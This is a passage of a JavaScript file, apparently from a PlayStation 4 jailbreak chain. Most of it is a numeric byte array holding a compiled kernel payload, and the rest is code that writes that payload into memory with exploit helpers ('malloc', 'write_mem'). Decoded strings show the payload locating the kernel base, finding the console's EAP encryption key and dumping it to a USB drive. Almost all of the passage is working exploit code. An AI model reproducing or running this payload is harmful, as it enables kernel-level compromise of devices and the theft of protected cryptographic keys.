141,53,59,9,0,0,232,246,251,255,255,139,61,244,15,0,0,72,141,21,53,16,0,0,72,141,53,52,9,0,0,232,221,251,255,255,139,61,219,15,0,0,72,141,21,84,16,0,0,72,141,53,44,9,0,0,232,196,251,255,255,139,61,194,15,0,0,72,141,21,27,16,0,0,72,141,53,27,9,0,0,232,171,251,255,255,139,61,169,15,0,0,72,141,21,66,16,0,0,72,141,53,17,9,0,0,232,146,251,255,255,139,61,144,15,0,0,72,141,21,81,16,0,0,72,141,53,17,9,0,0,232,121,251,255,255,139,61,119,15,0,0,72,141,21,192,15,0,0,72,141,53,22,9,0,0,232,96,251,255,255,139,61,94,15,0,0,72,141,21,103,15,0,0,72,141,53,22,9,0,0,232,71,251,255,255,139,61,69,15,0,0,72,141,21,214,15,0,0,72,141,53,26,9,0,0,232,46,251,255,255,139,61,44,15,0,0,72,141,21,21,16,0,0,72,141,53,15,9,0,0,232,21,251,255,255,139,61,19,15,0,0,72,141,21,124,15,0,0,72,141,53,4,9,0,0,232,252,250,255,255,139,61,250,14,0,0,72,141,21,131,15,0,0,72,141,53,249,8,0,0,232,227,250,255,255,139,61,225,14,0,0,72,141,21,130,15,0,0,72,141,53,239,8,0,0,232,202,250,255,255,139,61,200,14,0,0,72,141,21,233,14,0,0,72,141,53,229,8,0,0,232,177,250,255,255,139,61,175,14,0,0,72,141,21,120,15,0,0,72,141,53,219,8,0,0,232,152,250,255,255,139,61,150,14,0,0,72,141,21,127,14,0,0,72,141,53,210,8,0,0,232,127,250,255,255,139,61,125,14,0,0,72,141,21,46,15,0,0,72,141,53,207,8,0,0,232,102,250,255,255,139,61,100,14,0,0,72,141,21,141,14,0,0,72,141,53,206,8,0,0,232,77,250,255,255,139,61,75,14,0,0,72,141,21,172,14,0,0,72,141,53,204,8,0,0,232,52,250,255,255,139,61,50,14,0,0,72,141,21,51,15,0,0,72,141,53,186,8,0,0,232,27,250,255,255,139,61,25,14,0,0,72,141,21,106,14,0,0,72,141,53,174,8,0,0,232,2,250,255,255,139,61,0,14,0,0,72,141,21,17,14,0,0,72,141,53,157,8,0,0,232,233,249,255,255,139,61,231,13,0,0,72,141,21,192,14,0,0,72,141,53,139,8,0,0,232,208,249,255,255,139,61,206,13,0,0,72,141,21,119,14,0,0,72,141,53,127,8,0,0,232,183,249,255,255,139,61,181,13,0,0,72,141,21,150,14,0,0,72,141,53,125,8,0,0,232,158,249,255,255,139,61,156,13,0,0,72,141,21,205,13,0,0,72,141,53,122,8,0,0,232,133,249,255,255,139,61,131,13,0,0,72,141,21,84,14,0,0,72,141,53,119,8,0,0,232,108,249,255,255,139,61,106,13,0,0,72,141,21,99,14,0,0,72,141,53,116,8,0,0,232,83,249,255,255,139,61,81,13,0,0,72,141,21,138,13,0,0,72,141,53,113,8,0,0,232,58,249,255,255,139,61,56,13,0,0,72,141,21,41,13,0,0,72,141,53,95,8,0,0,232,33,249,255,255,139,61,31,13,0,0,72,141,21,56,13,0,0,72,141,53,77,8,0,0,232,8,249,255,255,139,61,6,13,0,0,72,141,21,247,13,0,0,72,141,53,59,8,0,0,232,239,248,255,255,139,61,237,12,0,0,72,141,21,110,13,0,0,72,141,53,41,8,0,0,232,214,248,255,255,139,61,212,12,0,0,72,141,21,141,13,0,0,72,141,53,23,8,0,0,232,189,248,255,255,139,61,187,12,0,0,72,141,21,44,13,0,0,88,72,141,53,6,8,0,0,233,163,248,255,255,72,49,192,73,137,202,15,5,114,1,195,72,131,61,20,13,0,0,0,116,24,80,255,21,11,13,0,0,89,137,8,72,199,192,255,255,255,255,72,199,194,255,255,255,255,195,98,122,101,114,111,32,97,116,32,48,120,37,48,49,54,108,108,120,10,0,10,10,10,72,69,76,76,79,32,70,82,79,77,32,89,79,85,82,32,75,69,82,78,32,68,85,68,69,32,61,41,10,10,10,0,107,101,114,110,101,108,32,98,97,115,101,32,105,115,58,48,120,37,48,49,54,108,108,120,10,0,117,97,100,100,114,32,105,115,58,48,120,37,48,49,54,108,108,120,10,0,101,97,112,32,107,101,121,32,102,111,117,110,100,10,0,100,117,109,112,105,110,103,32,101,97,112,32,107,101,121,46,46,46,46,10,0,47,109,110,116,47,117,115,98,48,47,101,97,112,95,107,101,121,46,98,105,110,0,68,117,109,112,101,100,32,116,111,32,47,109,110,116,47,117,115,98,48,47,101,97,112,95,107,101,121,46,98,105,110,10,0,85,83,66,32,110,111,116,32,102,111,117,110,100,10,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,85,116,105,108,46,115,112,114,120,0,47,115,121,115,116,101,109,47,99,111,109,109,111,110,47,108,105,98,47,108,105,98,83,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,46,115,112,114,120,0,115,99,101,83,121,115,85,116,105,108,83,101,110,100,83,121,115,116,101,109,78,111,116,105,102,105,99,97,116,105,111,110,87,105,116,104,84,101,120,116,0,115,99,101,83,121,115,116,101,109,83,101,114,118,105,99,101,76,97,117,110,99,104,87,101,98,66,114,111,119,115,101,114,0,37,115,0,108,105,98,83,99,101,76,105,98,99,73,110,116,101,114,110,97,108,46,115,112,114,120,0,109,97,108,108,111,99,0,102,114,101,101,0,99,97,108,108,111,99,0,114,101,97,108,108,111,99,0,109,101,109,97,108,105,103,110,0,109,101,109,115,101,116,0,109,101,109,99,112,121,0,109,101,109,99,109,112,0,115,116,114,99,112,121,0,115,116,114,110,99,112,121,0,115,116,114,99,97,116,0,115,116,114,110,99,97,116,0,115,116,114,108,101,110,0,115,116,114,99,109,112,0,115,116,114,110,99,109,112,0,115,112,114,105,110,116,102,0,115,110,112,114,105,110,116,102,0,115,115,99,97,110,102,0,115,116,114,99,104,114,0,115,116,114,114,99,104,114,0,115,116,114,115,116,114,0,115,116,114,100,117,112,0,114,105,110,100,101,120,0,105,115,100,105,103,105,116,0,97,116,111,105,0,115,116,114,108,99,112,121,0,115,116,114,101,114,114,111,114,0,95,71,101,116,112,99,116,121,112,101,0,95,83,116,111,117,108,0,98,99,111,112,121,0,115,114,97,110,100,0,97,115,99,116,105,109,101,0,97,115,99,116,105,109,101,95,114,0,103,109,116,105,109,101,0,103,109,116,105,109,101,95,115,0,108,111,99,97,108,116,105,109,101,0,108,111,99,97,108,116,105,109,101,95,114,0,109,107,116,105,109,101,0,111,112,101,110,100,105,114,0,114,101,97,100,100,105,114,0,114,101,97,100,100,105,114,95,114,0,116,101,108,108,100,105,114,0,115,101,101,107,100,105,114,0,114,101,119,105,110,100,100,105,114,0,99,108,111,115,101,100,105,114,0,100,105,114,102,100,0,103,101,116,112,114,111,103,110,97,109,101,0,102,111,112,101,110,0,102,114,101,97,100,0,102,119,114,105,116,101,0,102,115,101,101,107,0,102,116,101,108,108,0,102,99,108,111,115,101,0,102,112,114,105,110,116,102,0,108,105,98,83,99,101,78,101,116,46,115,112,114,120,0,115,99,101,78,101,116,83,111,99,107,101,116,0,115,99,101,78,101,116,83,111,99,107,101,116,67,108,111,115,101,0,115,99,101,78,101,116,67,111,110,110,101,99,116,0,115,99,101,78,101,116,83,101,110,100,0,115,99,101,78,101,116,66,105,110,100,0,115,99,101,78,101,116,76,105,115,116,101,110,0,115,99,101,78,101,116,65,99,99,101,112,116,0,115,99,101,78,101,116,82,101,99,118,0,115,99,101,78,101,116,83,111,99,107,101,116,65,98,111,114,116,0,115,99,101,78,101,116,71,101,116,115,111,99,107,110,97,109,101,0,115,99,101,78,101,116,71,101,116,115,111,99,107,111,112,116,0,115,99,101,78,101,116,83,101,116,115,111,99,107,111,112,116,0,115,99,101,78,101,116,73,110,101,116,78,116,111,112,0,115,99,101,78,101,116,73,110,101,116,80,116,111,110,0,115,99,101,78,101,116,72,116,111,110,108,108,0,115,99,101,78,101,116,72,116,111,110,108,0,115,99,101,78,101,116,72,116,111,110,115,0,115,99,101,78,101,116,78,116,111,104,108,108,0,115,99,101,78,101,116,78,116,111,104,108,0,115,99,101,78,101,116,78,116,111,104,115,0,108,105,98,83,99,101,78,101,116,67,116,108,46,115,112,114,120,0,115,99,101,78,101,116,67,116,108,73,110,105,116,0,115,99,101,78,101,116,67,116,108,84,101,114,109,0,115,99,101,78,101,116,67,116,108,71,101,116,73,110,102,111,0,115,99,101,80,116,104,114,101,97,100,67,114,101,97,116,101,0,115,99,101,80,116,104,114,101,97,100,69,120,105,116,0,115,99,101,80,116,104,114,101,97,100,68,101,116,97,99,104,0,115,99,101,80,116,104,114,101,97,100,74,111,105,110,0,115,99,101,80,116,104,114,101,97,100,89,105,101,108,100,0,115,99,101,80,116,104,114,101,97,100,83,101,108,102,0,115,99,101,80,116,104,114,101,97,100,67,97,110,99,101,108,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,73,110,105,116,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,68,101,115,116,114,111,121,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,76,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,84,114,121,108,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,84,105,109,101,100,108,111,99,107,0,115,99,101,80,116,104,114,101,97,100,77,117,116,101,120,85,110,108,111,99,107,0,108,105,98,107,101,114,110,101,108,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,119,101,98,46,115,112,114,120,0,108,105,98,107,101,114,110,101,108,95,115,121,115,46,115,112,114,120,0,95,95,115,116,97,99,107,95,99,104,107,95,103,117,97,114,100,0,95,95,115,116,97,99,107,95,99,104,107,95,102,97,105,108,0,95,95,101,114,114,111,114,0,115,99,101,75,101,114,110,101,108,69,114,114,111,114,0,115,99,101,75,101,114,110,101,108,76,111,97,100,83,116,97,114,116,77,111,100,117,108,101,0,115,99,101,75,101,114,110,101,108,65,108,108,111,99,97,116,101,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,77,97,112,68,105,114,101,99,116,77,101,109,111,114,121,0,115,99,101,75,101,114,110,101,108,71,101,116,68,105,114,101,99,116,77,101,109,111,114,121,83,105,122,101,0,115,99,101,75,101,114,110,101,108,83,116,97,116,0,115,99,101,75,101,114,110,101,108,79,112,101,110,0,115,99,101,75,101,114,110,101,108,82,101,97,100,0,115,99,101,75,101,114,110,101,108,76,115,101,101,107,0,115,99,101,75,101,114,110,101,108,67,108,111,115,101,0,115,99,101,75,101,114,110,101,108,83,108,101,101,112,0,115,99,101,75,101,114,110,101,108,85,115,108,101,101,112,0,115,99,101,75,101,114,110,101,108,71,101,116,116,105,109,101,111,102,100,97,121,0,115,99,101,75,101,114,110,101,108,71,101,116,80,114,111,99,101,115,115,84,105,109,101,0,115,99,101,75,101,114,110,101,108,71,101,116,67,117,114,114,101,110,116,67,112,117,0,115,121,115,99,116,108,0,115,121,115,99,116,108,98,121,110,97,109,101,0,115,121,115,97,114,99,104,0,101,120,101,99,118,101,0,112,116,104,114,101,97,100,95,115,101,108,102,0,112,116,104,114,101,97,100,95,115,101,116,97,102,102,105,110,105,116,121,95,110,112,0,115,99,101,75,101,114,110,101,108,67,114,101,97,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,68,101,108,101,116,101,69,113,117,101,117,101,0,115,99,101,75,101,114,110,101,108,65,100,100,85,115,101,114,69,118,101,110,116,0,115,99,101,75,101,114,110,101,108,65,100,100,82,101,97,100,69,118,101,110,116,0,103,101,116,117,105,100,0,103,101,116,103,105,100,0,103,101,116,112,105,100,0,115,101,116,117,105,100,0,115,101,116,103,105,100,0,115,101,116,114,101,117,105,100,0,115,101,116,114,101,103,105,100,0,47,108,105,98,54,52,47,108,100,45,108,105,110,117,120,45,120,56,54,45,54,52,46,115,111,46,50,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,245,254,255,111,0,0,0,0,88,25,32,38,9,0,0,0,5,0,0,0,0,0,0,0,80,25,32,38,9,0,0,0,6,0,0,0,0,0,0,0,56,25,32,38,9,0,0,0,10,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,11,0,0,0,0,0,0,0,24,0,0,0,0,0,0,0,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,0,0,0,0,0,0,0,8,0,0,0,0,0,0,0,251,255,255,111,0,0,0,0,1,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];

window.mira_blob_2_len = 0x1a58;
window.mira_blob_2 = malloc(window.mira_blob_2_len);
write_mem(window.mira_blob_2, payload);
